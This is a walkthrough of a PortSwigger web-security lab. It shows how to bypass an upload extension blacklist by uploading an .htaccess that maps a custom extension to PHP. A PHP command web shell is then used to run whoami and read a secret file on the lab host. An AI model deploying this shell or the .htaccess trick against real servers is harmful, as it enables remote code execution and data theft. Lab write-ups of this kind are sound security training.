# 1 - Web shell upload via extension blacklist bypass

This lab contains a vulnerable image upload function. Certain file extensions are blacklisted, but this defense can be bypassed due to a fundamental flaw in the configuration of this blacklist.

To solve the lab, upload a basic PHP web shell, then use it to exfiltrate the contents of the file /home/carlos/secret. Submit this secret using the button provided in the lab banner.

You can log in to your own account using the following credentials: wiener:peter


----------------------------------------------

Reference: https://portswigger.net/web-security/file-upload

----------------------------------------------

Generated endpoint: https://0a6000ce04de65cfc3e8c5ac00d700ed.web-security-academy.net

Update .htaccess:

```
-----------------------------230880832739977645353483474501
Content-Disposition: form-data; name="avatar"; filename=".htaccess"
Content-Type: application/octet-stream

AddType application/x-httpd-php .l33t

```

![img](images/1%20-%20Web%20shell%20upload%20via%20extension%20blacklist%20bypass/1.png)

![img](images/1%20-%20Web%20shell%20upload%20via%20extension%20blacklist%20bypass/2.png)

Upload Phpinfo():

```
-----------------------------230880832739977645353483474501
Content-Disposition: form-data; name="avatar"; filename="test.l33t"
Content-Type: application/octet-stream

<?php phpinfo(); ?>

```

![img](images/1%20-%20Web%20shell%20upload%20via%20extension%20blacklist%20bypass/3.png)

![img](images/1%20-%20Web%20shell%20upload%20via%20extension%20blacklist%20bypass/4.png)


Update cmdshell:

```
-----------------------------230880832739977645353483474501
Content-Disposition: form-data; name="avatar"; filename="cmd.l33t"
Content-Type: application/octet-stream

<?php
if($_GET['cmd']) {
  system($_GET['cmd']);
}
```

![img](images/1%20-%20Web%20shell%20upload%20via%20extension%20blacklist%20bypass/5.png)

<br>

RCE:

https://0a6000ce04de65cfc3e8c5ac00d700ed.web-security-academy.net/files/avatars/cmd.l33t?cmd=whoami
carlos

https://0a6000ce04de65cfc3e8c5ac00d700ed.web-security-academy.net/files/avatars/cmd.l33t?cmd=cat%20/home/carlos/secret
MzrfsTWgFr82UcKq9wFC0hObV7YSVmlq

![img](images/1%20-%20Web%20shell%20upload%20via%20extension%20blacklist%20bypass/6.png)

![img](images/1%20-%20Web%20shell%20upload%20via%20extension%20blacklist%20bypass/7.png)
